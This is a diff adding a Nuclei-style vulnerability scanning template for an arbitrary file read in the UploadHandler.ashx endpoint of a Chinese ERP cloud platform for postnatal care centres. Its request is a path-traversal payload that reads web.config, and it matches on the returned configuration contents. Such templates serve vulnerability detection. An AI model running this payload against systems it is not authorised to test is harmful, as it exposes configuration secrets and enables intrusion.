@@ -1,0 +1,22 @@
+id: poc-jintongfang-erp-uploadhandler-ashx-anyfile-read
+info:
+  name: 任意文件读取漏洞 - 月子会所ERP管理云平台 UploadHandler.ashx
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Page/upload/UploadHandler.ashx?url=../../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"data\":"
+          - "</system.web>"
+          - "<configuration>"
+          - "有关如何配置 ASP.NET 应用程序的详细信息"
+        part: body
